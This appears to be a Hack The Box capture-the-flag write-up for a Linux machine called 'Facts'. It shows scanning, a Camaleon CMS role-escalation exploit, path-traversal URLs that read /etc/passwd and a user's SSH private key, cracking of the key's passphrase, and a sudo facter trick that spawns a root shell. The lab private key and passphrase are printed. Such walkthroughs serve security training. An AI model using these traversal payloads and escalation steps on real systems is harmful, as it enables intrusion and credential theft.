# HTB - Facts

## Machine info

| Type    | Info     |
| ---------- | ---------- |
| Name        | Facts      |
| Difficulty  | Easy       |
| OS         | Linux      |
| Release Date       | 2026-01-31 |


## User Flag

Like all CTF, it's start with a nmap scan to enumerate open port

### Nmap Scan 

```bash
nmap 10.129.22.148 -p- -T5 -sV -Pn
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-14 15:27 CEST
Warning: 10.129.22.148 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.22.148
Host is up (0.029s latency).
Not shown: 64396 closed tcp ports (conn-refused), 1136 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.75 seconds
```

Here I choose to focus on the website running on the port 80 first.

### Website scan

focusing on the http://facts.htb:80

![website_pic](screens/website_screen.png)

After browsing the website and checking the headers I didn't found anything really useful, so I started a Nuclei scan who didn't lead to anything useful and a file and directory discovery with ffuf.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://facts.htb/FUZZ
```

```text


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 925ms]
.ssh                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 925ms]
.bash_history           [Status: 200, Size: 11137, Words: 1328, Lines: 125, Duration: 923ms]
.htpasswd               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1008ms]
[...]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2629ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2498ms]
[...]
```

Here there is a lot of false positive, But the admin and the ajax webpage really exist and the webserver, the admin lead me to a login webpage

![login_pic](screens/login_page.png)

After creating an account, we can access to a dashboard, in this dashboard web can see that the website is running with camaleon CMS in his version 2.9.0


### CVE - CAMALEON 2.9.0

the camaleon CMS version who's running on the system is actually vulnerable to the CVE-2025-2304
using this POC : https://github.com/Alien0ne/CVE-2025-2304
I manage to change the role of the account that I've just created.

```bash
python/bin/python3 Machines/Facts/cve.py  -u http://facts.htb/ -U mat -P mat
```
```text
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Reverting User Role
```
My user mat is now admin and reveal new functionality in the dashboard.

After looking online what functionality of Camaleon CMS could I use to access to the backend I found that there is an other vulnerability on the version 2.9.0 of Camaleon CMS the CVE-2024-46987 (LFI & Path Traversal).
script for the vulnerability could be found here: https://www.exploit-db.com/exploits/52531
But instead of using the script I just tried to include the passwd file with

```text
http://facts.htb/admin/media/download_private_file?file=../../../../../../../../etc/passwd
```
I manage to download the passwd file from the server.

```text
[...]
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
[...]
```
we can see that there is 2 users in the system, after some attempt trying to get an ssh key with default ssh key name.

```text
http://facts.htb/admin/media/download_private_file?file=../../../../../../../../home/trivia/.ssh/id_ed25519
```
finally answer me with a key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABArdtQolq
RfiO5WZoGP+BfPAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIA6DEjrdX4EC71qP
YvWGQa9j/ddDbuwJAfJXUuc/x0AIAAAAoKNp7j3rqxQrjOnfrRL4hq+S7AbTTCLSpRVwsp
fjOUjBwikBYdFrbObcKBPRRpghv8mF3MkfsYgmujTsLy8wadxhV+/v4kvDfW9kOjJkL5+a
riYlZSzPozL/dAcCXV0fAkM+6uXkWp4YSoEApJe5bIXyuQS/c5pwTh4+jltfRMzTS0AAII
RPfVqTOgEkEYNlJs3kp+ua/LHFm+5vVWx7i/c=
-----END OPENSSH PRIVATE KEY-----
```

### Cracking the key

Trying to use the key to connect to ssh as the trivia user:

```text
ssh trivia@10.129.22.193 -i id_ed25519
```
```text
Enter passphrase for key 'id_ed25519':
```

unfortunately the key is protected with a passphrase, following this tutorial
https://labex.io/tutorials/kali-use-john-the-ripper-to-crack-ssh-private-keys-594223
I manage to convert the key to an hash with

```bash
ssh2john id_ed25519 > hash.txt
```
then cracking the created hash with the rockyou wordlist
```bash
john --wordlist=../../rockyou.txt hash.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)
1g 0:00:01:21 DONE (2026-06-14 19:44) 0.01222g/s 39.11p/s 39.11c/s 39.11C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now with the passphrase I manage to connect through SSH as the trivia user on the system.
The user flag is at /home/william/user.txt, and can be accessed without restriction even as trivia user.


## Root flag

### sudo analyse

first thing that I always try looking for specific privileges with the current user

```bash
sudo -l
```

```text
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

facter can be executed as root without any password.

### Facter exploit

instantly checking the GTFObins website for facter
https://gtfobins.org/gtfobins/facter/

It look like we can execute ruby programs with facter binary

So I created a very basic ruby script that spawn a sh shell.
```bash
trivia@facts:~$ echo 'exec "/bin/sh"' > shell.rb
```

And run facter bin to with the custom dir to execute the shell.rb file that i've just created

```bash
trivia@facts:~$ sudo facter --custom-dir=./
```

```text
# whoami
root
```

The script worked and give me a new shell as root.
The root flag is in /root/root.txt

and sign the end of this CTF.